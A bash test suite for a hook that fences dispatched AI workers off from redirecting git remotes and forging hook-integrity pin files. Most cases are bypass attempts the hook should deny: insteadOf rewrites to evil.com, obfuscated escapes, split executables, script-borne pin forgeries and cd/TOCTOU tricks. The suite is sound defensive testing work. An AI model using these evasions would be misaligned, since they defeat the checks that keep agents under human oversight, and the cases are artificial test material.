#!/usr/bin/env bash
# Smoke test for scripts/hooks/block-worker-write-fence.sh (the dispatched-worker
# write fence: pin-dir class + anchor-tamper class, keyed on HIMMEL_WORKER=1).
#
# Usage: bash scripts/hooks/test-block-worker-write-fence.sh
# Exit codes: 0 — all cases passed; 1 — at least one failed
set -uo pipefail

HOOK="$(cd "$(dirname "$0")" && pwd)/block-worker-write-fence.sh"
[ -x "$HOOK" ] || chmod +x "$HOOK"

FAILED=0
CASES=0
SKIPPED=0
GLM_URL="https://api.z.ai/api/anthropic"  # a dropped lane's URL: must no longer mark a worker
BASH_ABS=$(command -v bash)
EMPTY_PATH=$(mktemp -d -t wfence-empty.XXXXXX) || exit 1
native_dir() {
    (cd "$1" && pwd -W 2>/dev/null) || (cd "$1" && pwd -P)
}

# The anchor-tamper class resolves a `<a>/<b>` refspec
# destination against the REMOTE SET of $CLAUDE_PROJECT_DIR (`origin/main` is a
# tracking ref, `feat/x` is a branch). Pointing every case at a purpose-built
# fixture repo with exactly one known remote makes that verdict independent of
# whatever remotes the checkout running the suite happens to have — without it,
# every `x:origin/main` row would silently depend on the ambient repo. Cases
# that need a different repo (or none) override it: run_case appends "$@" AFTER
# this assignment, and a later env assignment wins.
ANCHOR_REPO=$(mktemp -d -t glm-anchor-repo.XXXXXX)
git init -q "$ANCHOR_REPO" >/dev/null 2>&1
git -C "$ANCHOR_REPO" remote add origin https://example.invalid/anchor.git >/dev/null 2>&1

# run_case <json> [VAR=val ...] — extra args become env assignments.
# Also unset the generalized worker-ness/pin-dir vars so a
# developer's own shell env (or a leftover from an earlier case) can never
# leak into a case that does not explicitly set them.
run_case() {
    local input="$1"; shift
    printf '%s' "$input" | env -u ANTHROPIC_BASE_URL \
        -u HIMMEL_WORKER -u HIMMEL_HOOK_INTEGRITY_DIR -u HIMMEL_HOOK_INTEGRITY_BYPASS_OK \
        CLAUDE_PROJECT_DIR="$ANCHOR_REPO" "$@" bash "$HOOK" >/dev/null 2>&1
    echo "$?"
}

assert_rc() {
    local label="$1" expected="$2" actual="$3"
    CASES=$((CASES + 1))
    if [ "$actual" = "$expected" ]; then
        echo "PASS $label (rc=$actual)"
    else
        echo "FAIL $label — expected rc=$expected, got rc=$actual"
        FAILED=$((FAILED + 1))
    fi
}

# skip_case <label> <reason> — platform-gated case whose premise cannot exist
# on this host. Still increments CASES (so EXPECTED_CASES stays a true
# invariant across platforms) but never FAILED; the SKIP line names what did
# not run and why, per the no-silent-skip rule.
skip_case() {
    local label="$1" reason="$2"
    CASES=$((CASES + 1))
    SKIPPED=$((SKIPPED + 1))
    echo "SKIP $label — $reason"
}

j_bash() { printf '{"tool_name":"Bash","tool_input":{"command":%s}}' "$(printf '%s' "$1" | jq -Rs .)"; }
j_pwsh() { printf '{"tool_name":"PowerShell","tool_input":{"command":%s}}' "$(printf '%s' "$1" | jq -Rs .)"; }

# A jq-missing runner fails CLOSED on a dispatched worker: the pin-dir class
# cannot evaluate anything without jq, so fail-open would leave it silently inert
# and reopen the pin-forging attack it exists to close.
run_case_no_jq_native() {
    printf '%s' "$1" | env -u ANTHROPIC_BASE_URL -u HIMMEL_WORKER "HIMMEL_WORKER=1" PATH="$EMPTY_PATH" "$BASH_ABS" "$HOOK" >/dev/null 2>&1
    echo "$?"
}

# --- OFF-LANE: everything allowed (expect rc=0) ---
assert_rc "off-lane git push"            0 "$(run_case "$(j_bash 'git push origin main')")"
assert_rc "off-lane gh pr create"        0 "$(run_case "$(j_bash 'gh pr create --title x')")"
assert_rc "off-lane mcp tool"            0 "$(run_case '{"tool_name":"mcp__plugin_github_github__merge_pull_request","tool_input":{}}')"
assert_rc "anthropic-url non-glm"        0 "$(run_case "$(j_bash 'git push')" "ANTHROPIC_BASE_URL=https://api.anthropic.com")"
assert_rc "glm url alone is not a worker lane (HIMMEL-7907)" 0 "$(run_case "$(j_bash 'git config --get remote.origin.url')" "ANTHROPIC_BASE_URL=$GLM_URL")"

# The plugin registration fails closed on the lane-agnostic worker marker.
HOOKS_JSON="$(cd "$(dirname "$HOOK")/../.." && pwd -P)/marketplace/plugins/himmel-ops/hooks/hooks.json"
REG_CMDS=$(jq -r '.. | .command? // empty' "$HOOKS_JSON")
# shellcheck disable=SC2016  # literal unexpanded $CLAUDE_PROJECT_DIR is the registered command text
if grep -q -F -e '--fail-closed-when "HIMMEL_WORKER=1" "$CLAUDE_PROJECT_DIR/scripts/hooks/block-worker-write-fence.sh"' <<< "$REG_CMDS"; then REG_RC=0; else REG_RC=1; fi
assert_rc "hooks.json registers the fence fail-closed on HIMMEL_WORKER=1 (HIMMEL-7907)" 0 "$REG_RC"

assert_rc "worker config --get url (pinned overmatch)" 2 "$(run_case "$(j_bash 'git config --get remote.origin.url')" "HIMMEL_WORKER=1")"
# url.<base>.pushInsteadOf rewrites where a push LANDS without naming a remote
# or a pushurl, so it is the same escape as `remote set-url` by another key.
# Both directions are denied: setting one redirects a push, and unsetting one
# removes an operator redirect the worker was never asked to touch.
assert_rc "worker config pushInsteadOf set"   2 "$(run_case "$(j_bash 'git config url.https://github.com/.pushInsteadOf git@github.com:')" "HIMMEL_WORKER=1")"
assert_rc "worker config pushInsteadOf unset" 2 "$(run_case "$(j_bash 'git config --unset url.https://github.com/.pushInsteadOf')" "HIMMEL_WORKER=1")"
assert_rc "worker config insteadOf rewrite" 2 "$(run_case "$(j_bash 'git config url.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
assert_rc "worker config pushInsteadOf rewrite" 2 "$(run_case "$(j_bash 'git config url.https://evil.com/.pushInsteadOf https://github.com/')" "HIMMEL_WORKER=1")"
assert_rc "worker config --global insteadOf rewrite" 2 "$(run_case "$(j_bash 'git config --global url.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
assert_rc "worker config insteadof case variant" 2 "$(run_case "$(j_bash 'git config URL.https://evil.com/.INSTEADOF https://github.com/')" "HIMMEL_WORKER=1")"
assert_rc "worker git -c insteadOf one-shot fetch" 2 "$(run_case "$(j_bash 'git -c url.https://evil.com/.insteadOf=https://github.com/ fetch')" "HIMMEL_WORKER=1")"
assert_rc "worker git --config-env insteadOf one-shot fetch" 2 "$(run_case "$(j_bash 'git --config-env=url.https://evil.com/.insteadOf=R fetch')" "HIMMEL_WORKER=1")"
assert_rc "worker git config set insteadOf rewrite" 2 "$(run_case "$(j_bash 'git config set url.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
# A dequoted key is the same key — quoting/escaping must not slip past.
assert_rc "worker config single-quoted insteadOf key" 2 "$(run_case "$(j_bash "git config 'url.https://evil.com/.insteadOf' https://github.com/")" "HIMMEL_WORKER=1")"
assert_rc "worker config double-quoted insteadOf key" 2 "$(run_case "$(j_bash 'git config "url.https://evil.com/.insteadOf" https://github.com/')" "HIMMEL_WORKER=1")"
assert_rc "worker config backslash-split insteadOf key" 2 "$(run_case "$(j_bash 'git config ur\l.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
assert_rc "worker config ANSI-C quoted insteadOf key" 2 "$(run_case "$(j_bash "git config \$'url.https://evil.com/.insteadOf' https://github.com/")" "HIMMEL_WORKER=1")"
assert_rc "worker config upper-case URL.INSTEADOF key" 2 "$(run_case "$(j_bash 'git config URL.https://evil.com/.INSTEADOF https://github.com/')" "HIMMEL_WORKER=1")"
assert_rc "worker config set --file value before insteadOf key" 2 "$(run_case "$(j_bash 'git config set --file .git/config url.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
assert_rc "worker config --type value before insteadOf key" 2 "$(run_case "$(j_bash 'git config --type bool --file .git/config url.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
assert_rc "worker config ANSI-C hex escape in key" 2 "$(run_case "$(j_bash "git config \$'url.https://evil.com/.\\x69nsteadOf' https://github.com/")" "HIMMEL_WORKER=1")"
assert_rc "worker git -c ANSI-C escape" 2 "$(run_case "$(j_bash "git -c \$'url.https://evil.com/.\\x69nsteadOf=https://github.com/' fetch")" "HIMMEL_WORKER=1")"
assert_rc "worker git -c core.pager=cat log allowed" 0 "$(run_case "$(j_bash 'git -c core.pager=cat log')" "HIMMEL_WORKER=1")"
assert_rc "worker round 6 quoted git + ANSI-C hex key" 2 "$(run_case "$(j_bash "\"git\" config \$'url.x/.\\x69nsteadOf' Y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 6 quoted git + plain key" 2 "$(run_case "$(j_bash '"git" config url.x/.insteadof Y')" "HIMMEL_WORKER=1")"
assert_rc "worker round 6 split git executable + -c key" 2 "$(run_case "$(j_bash "g''it -c url.x.insteadof=y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 6 git log --oneline allowed" 0 "$(run_case "$(j_bash 'git log --oneline')" "HIMMEL_WORKER=1")"
assert_rc "worker round 7 octal executable" 2 "$(run_case "$(j_bash "\$'\\147\\151\\164' config url.x.insteadof Y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 7 escaped config subcommand" 2 "$(run_case "$(j_bash "git \$'\\x63onfig' url.x.insteadof Y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 7 split executable g\$'\\x69'\"t\"" 2 "$(run_case "$(j_bash "g\$'\\x69'\"t\" -c url.x.insteadof=y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 7 unterminated ANSI-C segment" 2 "$(run_case "$(j_bash "git config \$'url.x.insteadof Y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 7 NUL octal ends the segment, Of joins" 2 "$(run_case "$(j_bash "git config \$'url.x.instead\\0junk'Of Y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 7 NUL hex ends the segment, Of joins" 2 "$(run_case "$(j_bash "git config \$'url.x.instead\\x00junk'Of Y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 8 single-quoted decoy" 2 "$(run_case "$(j_bash "echo '$' ; git config \$'url.x.\\x69nsteadOf' y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 8 double-quoted decoy" 2 "$(run_case "$(j_bash "echo \"$'\" ; git config \$'url.x.\\x69nsteadOf' y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 9 decoy + split executable" 2 "$(run_case "$(j_bash "echo '$' ; g\$'\\x69't config url.x.insteadOf y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 10 codex-1 NUL via \\c@ ends the segment" 2 "$(run_case "$(j_bash "git config \$'url.x.instead\\c@junk'Of y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 10 codex-2 decoy + two adjacent split segments" 2 "$(run_case "$(j_bash "echo '$' ; g\$'\\x69'\$'\\x74' config url.x.insteadOf y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 10 plain backslash-t inside the key" 2 "$(run_case "$(j_bash "git config url.x.ins\\teadOf y")" "HIMMEL_WORKER=1")"
assert_rc "worker round 10 plain backslash-r inside url" 2 "$(run_case "$(j_bash "git config remote.origin.u\\rl https://evil")" "HIMMEL_WORKER=1")"
assert_rc "worker HIMMEL-4032 backslash-newline split insteadOf key" 2 "$(run_case "$(j_bash "$(printf 'command git config url.x.inste\\\nadOf Y')")" "HIMMEL_WORKER=1")"
# The two rows below are denied by the anchor-tamper ANSI-C arm (`git` + a
# dollar-quote in its args); pinned so a change to that arm is visible. The codex
# fence and parity guard pin the ALLOW verdict.
assert_rc "worker round 7 git commit -m ANSI-C denied by anchor arm (HIMMEL-2528)" 2 "$(run_case "$(j_bash "git commit -m \$'l1\\nl2'")" "HIMMEL_WORKER=1")"
assert_rc "worker round 7 git log --format=ANSI-C denied by anchor arm (HIMMEL-2528)" 2 "$(run_case "$(j_bash "git log --format=\$'%h\\t%s'")" "HIMMEL_WORKER=1")"
assert_rc "worker git -c quoted insteadOf one-shot fetch" 2 "$(run_case "$(j_bash "git -c 'url.https://evil.com/.insteadOf=https://github.com/' fetch")" "HIMMEL_WORKER=1")"
assert_rc "worker config user.name allowed" 0 "$(run_case "$(j_bash 'git config user.name x')" "HIMMEL_WORKER=1")"
assert_rc "worker remote -v allowed" 0 "$(run_case "$(j_bash 'git remote -v')" "HIMMEL_WORKER=1")"
assert_rc "native worker jq missing ALSO fails closed (round-3 [codex-1] reversal)" 2 "$(run_case_no_jq_native "$(j_bash 'git status')")"
assert_rc "worker malformed JSON allows (documented)" 0 "$(run_case '{not json' "HIMMEL_WORKER=1")"

# --- hook-integrity pin-dir write-fence (worker-ness, not lane) --
# The pin-dir class is gated on HIMMEL_WORKER=1 alone. These cases pin: (a) a
# headed/off-lane session stays unaffected, (b) a dispatched worker is denied,
# (c) the documented bypass works, and (d) the fence is only these two classes,
# not a push/gh/network classifier (scope boundary, not a regression).
PIN_FIXTURE=$(mktemp -d -t hook-integrity.XXXXXX)
PIN_FIXTURE_NATIVE=$(native_dir "$PIN_FIXTURE")
PIN_WRITE_CMD="echo pwned > $PIN_FIXTURE/forged-session.json"
PIN_WRITE_CMD_NATIVE="echo pwned > $PIN_FIXTURE_NATIVE/forged-session.json"

assert_rc "pin-dir write off-lane (headed session, unaffected)" 0 \
    "$(run_case "$(j_bash "$PIN_WRITE_CMD")" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

assert_rc "pin-dir write denied for a native dispatched worker (HIMMEL-2085)" 2 \
    "$(run_case "$(j_bash "$PIN_WRITE_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "pin-dir write denied via native Windows-style path spelling" 2 \
    "$(run_case "$(j_bash "$PIN_WRITE_CMD_NATIVE")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE_NATIVE")"
assert_rc "pin-dir write denied via PowerShell (native worker)" 2 \
    "$(run_case "$(j_pwsh "Set-Content -Path $PIN_FIXTURE/x.json -Value pwned")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# The outer-command checks above scan
# only tool_input.command text, so `bash script.sh` (script.sh containing the
# forge payload) passed every check while the SCRIPT still forged the pin.
# Absolute script paths keep this hermetic regardless of the test runner's cwd.
PIN_SCRIPT_DIR=$(mktemp -d -t pin-script.XXXXXX)
PIN_SCRIPT_FORGE="$PIN_SCRIPT_DIR/forge.sh"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_SCRIPT_FORGE"
PIN_SCRIPT_BENIGN="$PIN_SCRIPT_DIR/benign.sh"
printf 'echo hello world\n' > "$PIN_SCRIPT_BENIGN"
assert_rc "pin-dir write denied via invoked script content (codex-1 round 4)" 2 \
    "$(run_case "$(j_bash "bash $PIN_SCRIPT_FORGE")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "pin-dir write denied via dot-sourced script content (codex-1 round 4)" 2 \
    "$(run_case "$(j_bash ". $PIN_SCRIPT_FORGE")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "benign invoked script allowed (round-4 fix, no false positive)" 0 \
    "$(run_case "$(j_bash "bash $PIN_SCRIPT_BENIGN")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "pin-dir invoked-script check skips a nonexistent path (fail-open on non-evaluable)" 0 \
    "$(run_case "$(j_bash 'bash /nonexistent/path/for/this/test.sh')" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# The first extraction above
# only matched an interpreter word immediately followed by whitespace then an
# UNQUOTED path -- direct execution (no interpreter word at all), a dash-option
# before the path, a quoted path, and the `node` interpreter (an explicitly
# documented dispatched-worker grant, Bash(node *), alongside Bash(bash *))
# all bypassed it.
PIN_SCRIPT_FORGE_JS="$PIN_SCRIPT_DIR/forge.js"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_SCRIPT_FORGE_JS"
assert_rc "pin-dir write denied via direct script execution, no interpreter word (codex-1 round 5)" 2 \
    "$(run_case "$(j_bash "$PIN_SCRIPT_FORGE")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "pin-dir write denied via bash -x with a dash option before the path (codex-1 round 5)" 2 \
    "$(run_case "$(j_bash "bash -x $PIN_SCRIPT_FORGE")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "pin-dir write denied via a quoted script path (codex-1 round 5)" 2 \
    "$(run_case "$(j_bash "bash \"$PIN_SCRIPT_FORGE\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "pin-dir write denied via the node interpreter (codex-2 round 5)" 2 \
    "$(run_case "$(j_bash "node $PIN_SCRIPT_FORGE_JS")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
assert_rc "benign direct-exec script still allowed (round-5 fix, no false positive)" 0 \
    "$(run_case "$(j_bash "$PIN_SCRIPT_BENIGN")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# The regex-patch extraction still truncated a quoted path
# containing a SPACE to its first whitespace-delimited token, and matched an
# absolute/path-qualified interpreter (`/bin/bash forge.sh`) as a direct-exec
# target on the INTERPRETER itself rather than extracting its script argument.
# Root-caused with a quote-aware tokenizer (this file's own commentary above
# the awk block) instead of a third regex patch.
PIN_SCRIPT_SPACE_DIR=$(mktemp -d -t "pin-space.XXXXXX")
PIN_SCRIPT_SPACE_FORGE="$PIN_SCRIPT_SPACE_DIR/my forge.sh"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_SCRIPT_SPACE_FORGE"
assert_rc "pin-dir write denied via a quoted script path containing a space (codex-2 round 5 re-review)" 2 \
    "$(run_case "$(j_bash "bash \"$PIN_SCRIPT_SPACE_FORGE\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
PIN_BASH_ABS=$(command -v bash)
if [ -n "$PIN_BASH_ABS" ]; then
    assert_rc "pin-dir write denied via an absolute interpreter path (codex-3 round 5 re-review)" 2 \
        "$(run_case "$(j_bash "$PIN_BASH_ABS $PIN_SCRIPT_FORGE")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
fi

# A `cd <dir> &&`
# segment ahead of the script invocation must shift the resolution cwd for
# every later segment -- the awk tokenizer used a STATIC tool_cwd and missed
# a script the command actually ran from a subdirectory. $PIN_SCRIPT_DIR is
# absolute, so `cd`-ing there keeps this hermetic regardless of the test
# runner's own cwd; `forge.sh` is deliberately RELATIVE here to exercise the
# post-cd resolution.
assert_rc "pin-dir write denied via cd-then-invoke with a relative script path (codex-2 round 5 re-review pass 2)" 2 \
    "$(run_case "$(j_bash "cd $PIN_SCRIPT_DIR && bash forge.sh")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- Three residuals in the awk tokenizer,
# root-caused with a single-pass quote/escape-aware scanner (see the file's
# own commentary above the awk block) instead of another regex/split patch.
# codex-1: a `;` inside a QUOTED script path used to split the command
# mid-token because segment splitting ran BEFORE quote-aware tokenization.
PIN_SCRIPT_SEMI_FORGE="$PIN_SCRIPT_DIR/forge;payload.sh"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_SCRIPT_SEMI_FORGE"
assert_rc "pin-dir write denied via a semicolon inside a quoted script path (HIMMEL-2200 codex-1)" 2 \
    "$(run_case "$(j_bash "bash \"$PIN_SCRIPT_SEMI_FORGE\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# codex-2: a backslash-escaped space in an UNQUOTED path is a legitimate shell
# escaping form; the old tokenizer had no backslash handling at all and would
# truncate at the first (apparently unescaped) space. Reuses the existing
# space-containing fixture file, referenced via its escaped-space spelling
# instead of quotes.
PIN_ESCAPED_SPACE_CMD="bash ${PIN_SCRIPT_SPACE_DIR}/my\\ forge.sh"
assert_rc "pin-dir write denied via a backslash-escaped space in an unquoted script path (HIMMEL-2200 codex-2)" 2 \
    "$(run_case "$(j_bash "$PIN_ESCAPED_SPACE_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# codex-3: the round-5 cd-tracking advanced the modeled cwd unconditionally,
# even when the cd target does not exist on disk. A real shell's failed `cd`
# leaves it in the ORIGINAL directory, so `cd <nonexistent>; bash forge.sh`
# still executes forge.sh from tool_cwd -- pre-fix, the unconditional advance
# resolved forge.sh against the (nonexistent) target instead, the file check
# skipped a path that doesn't exist, and the pin payload was missed entirely
# (a false ALLOW). tool_cwd is set to $PIN_SCRIPT_DIR (which holds the pin
# payload forge.sh from the codex-1 round-4 fixture above) via an explicit
# tool_input.cwd, so a correct fix must still catch it after the failed cd.
PIN_CD_FAIL_JSON=$(jq -n --arg cmd "cd /this/definitely/does/not/exist/himmel-2200; bash forge.sh" \
    --arg cwd "$PIN_SCRIPT_DIR" '{tool_name:"Bash", tool_input:{command:$cmd, cwd:$cwd}}')
assert_rc "pin-dir write denied because a failed cd must not advance the modeled cwd (HIMMEL-2200 codex-3)" 2 \
    "$(run_case "$PIN_CD_FAIL_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- The backslash
# handling added above was itself too broad -- it fired unconditionally even
# when the mediated tool is PowerShell (backslash is an ordinary literal
# character there, never an escape), stripping the separators out of a native
# Windows path and missing the real script. It also over-escaped inside a
# BASH double-quoted string: real bash only treats `\$` `` \` `` `\"` `\\` as
# special there, so a backslash before an ordinary character (the `U` in
# `C:\Users`) must stay literal, both characters kept.
PIN_SCRIPT_DIR_NATIVE=$(native_dir "$PIN_SCRIPT_DIR")
# These two rows exercise a native Windows backslash path and only hold a
# premise under a real Windows/MSYS host. native_dir()'s `pwd -W` is
# MSYS-only; on POSIX (this box included) it always falls through to
# `pwd -P`, so PIN_SCRIPT_DIR_NATIVE is a plain POSIX path here, the
# backslash below is NOT a path separator, and the constructed command names
# a different, nonexistent file. The guard correctly does not deny that --
# rc=0 is right, there is no guard gap. Same platform predicate + SKIP voice
# as scripts/luna/test-qmd-cadence.sh and scripts/graphify/test-ggs-cadence.sh.
case "${OSTYPE:-$(uname -s 2>/dev/null || echo unknown)}" in
    msys*|cygwin*|win32*|MINGW*)
        # PowerShell, UNQUOTED native path: pwsh dialect must disable
        # backslash-escape handling entirely, so the path resolves exactly as
        # spelled.
        assert_rc "pin-dir write denied via a native Windows backslash path under PowerShell, unquoted (HIMMEL-2200 codex-1)" 2 \
            "$(run_case "$(j_pwsh "bash ${PIN_SCRIPT_DIR_NATIVE}\\forge.sh")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
        # Bash, DOUBLE-QUOTED native path: a backslash before an ordinary
        # character inside double quotes is not one of bash's four real
        # escape targets and must stay literal (both characters kept), not be
        # silently dropped.
        assert_rc "pin-dir write denied via a native Windows backslash path in a bash double-quoted string (HIMMEL-2200 codex-1)" 2 \
            "$(run_case "$(j_bash "bash \"${PIN_SCRIPT_DIR_NATIVE}\\forge.sh\"")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
        ;;
    *)
        skip_case "pin-dir write denied via a native Windows backslash path under PowerShell, unquoted (HIMMEL-2200 codex-1)" \
            "no Windows/MSYS host here — native_dir()'s pwd -W is MSYS-only, so the backslash path is unreachable and rc=0 is already correct"
        skip_case "pin-dir write denied via a native Windows backslash path in a bash double-quoted string (HIMMEL-2200 codex-1)" \
            "no Windows/MSYS host here — native_dir()'s pwd -W is MSYS-only, so the backslash path is unreachable and rc=0 is already correct"
        ;;
esac

# --- The retired cd-existence `test -d` probe
# reflected
# filesystem state at HOOK-SCAN time, before any segment of the multi-segment
# command has executed -- a real, concrete TOCTOU. `rmdir real; cd real; bash
# forge.sh`: at scan time `real` genuinely exists, so a scan-time probe says
# "cd succeeds" and follows it -- but the real shell's `rmdir` removes `real`
# FIRST, so the real `cd` then FAILS and the shell stays in the ORIGINAL
# directory, exactly where the real forge.sh sits, unscanned by a
# probe-and-commit design. Root-caused by replacing the single tracked cwd
# with a small FORKED set of candidates: every cd keeps the pre-cd candidate
# (models "cd fails") AND adds the post-cd candidate (models "cd succeeds"),
# so whichever branch the real shell takes, one candidate matches it. This
# fixture creates `real` as a genuinely-existing subdirectory (so the retired
# test-d probe would have advanced into it) while the real payload sits at
# the ORIGINAL cwd -- the fork model's "stays put" candidate must still find
# it.
PIN_TOCTOU_DIR=$(mktemp -d -t pin-toctou.XXXXXX)
PIN_TOCTOU_FORGE="$PIN_TOCTOU_DIR/forge.sh"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_TOCTOU_FORGE"
mkdir -p "$PIN_TOCTOU_DIR/real"
PIN_TOCTOU_JSON=$(jq -n --arg cmd "rmdir real; cd real; bash forge.sh" --arg cwd "$PIN_TOCTOU_DIR" \
    '{tool_name:"Bash", tool_input:{command:$cmd, cwd:$cwd}}')
assert_rc "pin-dir write denied via rmdir-then-cd TOCTOU on an existing target (HIMMEL-2200 pr-check panel round 3 codex-1)" 2 \
    "$(run_case "$PIN_TOCTOU_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- The candidate-set fork model
# capped growth at MAXCAND by keeping the
# FIRST MAXCAND entries of the de-duped set -- but that set is built
# unchanged-block-first, advanced-block-second, so a plain first-N truncation
# systematically dropped EVERY "cd succeeds" candidate once enough distinct
# cd targets accumulated (candidates roughly double per distinct cd; MAXCAND=32
# means the 6th distinct cd is the first to overflow and get truncated),
# silently reopening the exact fork-model gap it exists to close. Fixed
# by truncating BALANCED -- up to half the cap from each block -- so a real
# execution path can never be dropped just because it was pushed second. This
# fixture chains 6 distinct cd targets, with the real payload only at the
# FINAL (6th) location -- exactly the shape that overflowed the naive
# first-N truncation.
PIN_CHAIN_DIR=$(mktemp -d -t pin-chain.XXXXXX)
for _n in 1 2 3 4 5; do mkdir -p "$PIN_CHAIN_DIR/d$_n"; done
mkdir -p "$PIN_CHAIN_DIR/d5/d6"
PIN_CHAIN_FORGE="$PIN_CHAIN_DIR/d5/d6/forge.sh"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_CHAIN_FORGE"
PIN_CHAIN_JSON=$(jq -n --arg cmd "cd $PIN_CHAIN_DIR/d1; cd ../d2; cd ../d3; cd ../d4; cd ../d5; cd d6; bash forge.sh" \
    --arg cwd "$PIN_CHAIN_DIR" '{tool_name:"Bash", tool_input:{command:$cmd, cwd:$cwd}}')
assert_rc "pin-dir write denied via 6 distinct cds overflowing MAXCAND (HIMMEL-2200 pr-check panel round 5 codex-1)" 2 \
    "$(run_case "$PIN_CHAIN_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

# --- `&&`/`||` short-circuit truthiness. The tokenizer segments
# on a bare `;`/`&`/`|` and has no notion of AND/OR short-circuit, so it models
# `false && cd existing` as if the cd ran while a real shell skips it and stays
# put. Against the earlier tokenizer (single modeled cwd, advanced
# unconditionally) that was a real fail-OPEN: the model moved into `existing`
# and never scanned the forge.sh actually sitting at the ORIGINAL cwd. The
# The fork model SUBSUMES it -- a cd forks rather than replaces, and a
# cd skipped by short-circuit is indistinguishable from a cd that ran and
# failed, which is exactly the preserved unchanged candidate. Verified
# both-direction against `git show 2bab2305:scripts/hooks/block-worker-write-fence.sh`
# (ALLOWS this shape) vs today (DENIES it); this case pins the behaviour so a
# future narrowing of the fork model cannot silently reopen it.
PIN_SHORTCIRCUIT_DIR=$(mktemp -d -t pin-shortcircuit.XXXXXX)
mkdir -p "$PIN_SHORTCIRCUIT_DIR/existing"
printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_SHORTCIRCUIT_DIR/forge.sh"
PIN_SHORTCIRCUIT_JSON=$(jq -n --arg cmd 'false && cd existing; bash forge.sh' \
    --arg cwd "$PIN_SHORTCIRCUIT_DIR" '{tool_name:"Bash", tool_input:{command:$cmd, cwd:$cwd}}')
assert_rc "pin-dir write denied when a short-circuited cd never runs (HIMMEL-2214, subsumed by the fork model)" 2 \
    "$(run_case "$PIN_SHORTCIRCUIT_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
# Negative control for the case above: identical command shape, benign script
# content. A rc=2 here would mean the case above proves nothing.
PIN_SHORTCIRCUIT_OK_DIR=$(mktemp -d -t pin-shortcircuit-ok.XXXXXX)
mkdir -p "$PIN_SHORTCIRCUIT_OK_DIR/existing"
printf 'echo hello world\n' > "$PIN_SHORTCIRCUIT_OK_DIR/forge.sh"
PIN_SHORTCIRCUIT_OK_JSON=$(jq -n --arg cmd 'false && cd existing; bash forge.sh' \
    --arg cwd "$PIN_SHORTCIRCUIT_OK_DIR" '{tool_name:"Bash", tool_input:{command:$cmd, cwd:$cwd}}')
assert_rc "short-circuit shape with benign script content still allowed (HIMMEL-2214 negative control)" 0 \
    "$(run_case "$PIN_SHORTCIRCUIT_OK_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"

